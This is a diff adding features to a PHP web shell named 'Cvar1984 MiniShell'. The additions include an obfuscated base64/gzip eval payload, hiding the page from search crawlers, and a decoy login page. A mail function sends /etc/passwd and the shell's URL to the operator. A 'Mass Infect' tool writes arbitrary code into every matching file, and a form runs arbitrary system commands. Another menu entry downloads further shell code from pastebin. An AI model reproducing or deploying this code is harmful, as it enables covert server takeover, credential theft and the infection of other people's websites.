@@ -1,4 +1,59 @@
 <?php
+eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents=array("
+    Googlebot",
+    "Slurp",
+    "MSNBot",
+    "PycURL",
+    "facebookexternalhit",
+    "ia_archiver",
+    "crawler",
+    "Yandex",
+    "Rambler",
+    "Yahoo! Slurp",
+    "YahooSeeker",
+    "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />";
+function mail_alert() {
+global $email;
+$passwd=file_get_contents('/etc/passwd');
+$shell_path="http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
+$subject="Logs";
+$from="From:Cvar1984";
+$content_mail="URL : $shell_path\nIP : ".$_SERVER['REMOTE_ADDR'] ."\n**********\n$passwd\n**********\nBy Cvar1984";
+mail($email,$subject,$content_mail,$from);
+}
+if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
+        if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
+           
+print '<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
+            if ($email != "") {
+                mail_alert();
+            }
+        }else {
+            if($_POST['usrname']) {
+                print'<script>alert("Wrong Username or password");</script>';
+            }
+            echo '
+<h1>Permission Denied</h1>
+<p>You don t have permission to access the this page.</p>
+<form method="post">
+
+<input class="hidden" type="password" size="30" name="passwrd" value="" onfocus="if (this.value == \'password\')
+this.value = \'\';">
+<input type="hidden" name="action" value="login">
+<input type="hidden" name="hide" value="">
+<input type="hidden" size="30" name="usrname" value="Cvar1984" onfocus="if (this.value == \'username\'){this.value = \'\';}">
+</form>';
+exit;
+}
+}
 @session_start();
 @ini_set('max_execution_time',0);
 @ini_set('memory_limit','999999999M');
@@ -11,31 +66,20 @@
 @ignore_user_abort(FALSE);
 @set_time_limit(0);
 @error_reporting(4);
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents=array(
-    "Google",
-    "Slurp",
-    "MSNBot",
-    "ia_archiver",
-    "Yandex",
-    "Rambler");
-if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
-    }
-}
-if(get_magic_quotes_gpc()){
-    foreach($_POST as $key=>$value){
-        $_POST[$key] = stripslashes($value);
-    }
-}
 if(strtolower(substr(PHP_OS,0,3)) == "win") {
     $os="win";
-    $sep="\\";
     $ox="Windows";
+    $sep="\\";
 }else {
     $os="nix";
     $ox="Linux";
+    $sep="/";
+}
+if(!function_exists('posix_getegid')) {
+	$user = @get_current_user();
+} else {
+	$uid = @posix_getpwuid(posix_geteuid());
+	$user = $uid['name'];
 }
 
 $self=$_SERVER['PHP_SELF'];
@@ -43,11 +87,10 @@ $server_sofware=$_SERVER['SERVER_SOFTWARE'];
 $ip_lu=$_SERVER['REMOTE_ADDR'];
 $ip_server=$_SERVER['SERVER_ADDR'];
 $admin=$_SERVER['SERVER_ADMIN'];
-
+$hostname=gethostbyname($_SERVER['HTTP_HOST']);
 echo '
 <!DOCTYPE HTML>
 <HTML>
-<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />
 <HEAD>
 <link href="http://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css" />
 <style type="text/css">
@@ -91,12 +134,21 @@ input,select,textarea{
 </HEAD>
 <BODY>
 <H1><center>Cvar1984 MiniShell</center></H1>';
+if(isset($_GET['path'])){
+    $path = $_GET['path'];   
+}else{
+    $path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
 echo "
 <table>
 <tr><td><a href=\"?cgi\">CGI Telnet</a></td></tr>
 <tr><td><a href=\"?b374k\">B374K</a></td></tr>
 <tr><td><a href=\"?adminer\">Adminer</a></td></tr>
 <tr><td><a href=\"?phpinfo\">PHP Info</a></td></tr>
+<tr><td><a href=\"?path={$path}&massinfect\">Mass Infect</a></td></tr>
+<tr><td><a href=\"?killme\">Self Remove</a></td></tr>
 </table>";
 if(isset($_REQUEST["phpinfo"])) {
 phpinfo();
@@ -111,7 +163,7 @@ elseif(isset($_REQUEST["cgi"])) {
 	fwrite($cgi, $cgi_script);
 	fwrite($htcgi, $isi_htcgi);
 	chmod($file_cgi, 0755);
-	if(file_exist("cgi/cgi.izo")) {
+	if(file_exists("cgi/cgi.izo")) {
 	header("location:cgi/cgi.izo");
 }else {
 echo "<script>alert('Failed');</script>";
@@ -123,7 +175,7 @@ $file=file_get_contents('https://pastebin.com/raw/nCqVmtBu');
 fwrite($nama, $file);
 chmod($nama, 0444);
 fclose($nama);
-if(file_exist("jembud2.php")) {
+if(file_exists("jembud2.php")) {
 header("location:jembud2.php");
 }else {
 echo "<script>alert('Failed');</script>";
@@ -134,23 +186,94 @@ $nama=fopen("adminer.php", "w");
 $file=file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
 fwrite($nama, $file);
 fclose($nama);
-if(file_exist("adminer.php")) {
+if(file_exists("adminer.php")) {
 header("location:adminer.php");
 }else {
 echo "<script>alert('Failed');</script>";
 }
 }
+elseif(isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
+	chdir($_GET['path']);
+    global $sep;
+    $mode=$_POST['modexxx'];
+    $ftype=$_POST['ffttype'];
+    $c_cont=$_POST['code_cont'];
+    $ppp=$_POST['path'];
+    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode!="" && $ftype!="" && $c_cont!="" && $ppp!="") {
+        echo "<center><h2>Mass Infect Successfully</h2></center><table>";
+        switch($mode) {
+            case "Apender":
+                $mmode="a";
+                break;
+            case "Rewrite":
+                $mmode="w";
+                break;
+        }if($handle = opendir($ppp)) {
+            while(($c_file = readdir($handle)) !== False) {
+                if((preg_match("/$ftype".'$'.'/', $c_file , $matches) != 0) && (preg_match('/'.$c_file.'$/', $self , $matches) != 1)) {
+                    echo "<tr><td><font
+color=red>$ppp$sep$c_file</font></td></tr>";
+                    $fd = fopen($ppp.$sep.$c_file,$mmode);
+                    if($fd) {
+                        fwrite($fd,$c_cont);
+                    }else {
+                        alert("Error. Access Denied");
+                    }
+                }
+            }
+        }
+        echo "</table><br><br><hr><br><br></div>";
+    }else {
+    ?>
+<center><h2>Mass Infect</h2></center><hr><br><br><table><form method='POST'>
+<input type='hidden' name='path' value="<?php echo getcwd();
+?>"><tr><td>Mode : </td>
+<td><select name='modexxx'>
+<option>Rewrite</option>
+<option>Apender</option>
+</select></td></tr>
+<tr><td>File Type</td><td>
+<input name='ffttype' value='html' size=50></td></tr>
+<tr><td>Content : </td>
+<td><textarea name='code_cont' style='width:383px;height:400px'></textarea></td></tr>
+<tr><td></td>
+<td><input type=submit value='Go' /></td></tr></form></table><br><br><hr><br><br>
+    <?php
+    }
+}
+elseif(isset($_REQUEST['killme'])) {
+    global $self;
+    $me=basename($self);
+    unlink($me);
+    echo "<script>alert('Have Nice Day');</script>";
+}
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
 echo '
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>PWD : ';
-if(isset($_GET['path'])){
-    $path = $_GET['path'];   
-}else{
-    $path = getcwd();
-}
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
 foreach($paths as $id=>$pat){
     if($pat == '' && $id == 0){
         $a = true;
@@ -324,6 +447,14 @@ if(isset($_GET['filesrc'])){
     echo '</table>
     </div>';
 }
+	echo "
+	<center><form method='post'>
+	<font style='text-decoration: underline;'>".$user."@".$hostname.": ~ $ </font>
+	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
+	</form></center>";
+	if($_POST['do_cmd']) {
+		echo "<pre>".exe($_POST['cmd'])."</pre>";
+	}
 echo '
 </BODY>
 </HTML>';
